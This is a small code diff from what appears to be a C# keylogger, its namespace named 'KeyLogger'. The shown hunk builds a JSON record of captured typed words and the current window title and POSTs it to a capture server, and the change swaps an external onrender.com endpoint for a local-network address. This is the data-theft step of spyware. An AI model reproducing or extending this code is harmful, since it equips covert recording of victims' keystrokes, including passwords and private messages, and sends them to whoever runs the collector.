@@ -41,7 +41,7 @@ namespace KeyLogger {
       ThreadPool.QueueUserWorkItem(state => {
         try {
           string jsonBody = "{ \"words\": \"" + word.Replace("\"", "\\\"") + "\", \"window_title\": \"" + currentWindowTitle.Replace("\"", "\\\"") + "\" }";
-          string url = "https://xenv1.onrender.com/captures";
+          string url = "http://192.168.1.111:3000/captures";
           var webRequest = WebRequest.Create(url);
           webRequest.Method = "POST";
           byte[] byteArray = Encoding.UTF8.GetBytes(jsonBody);
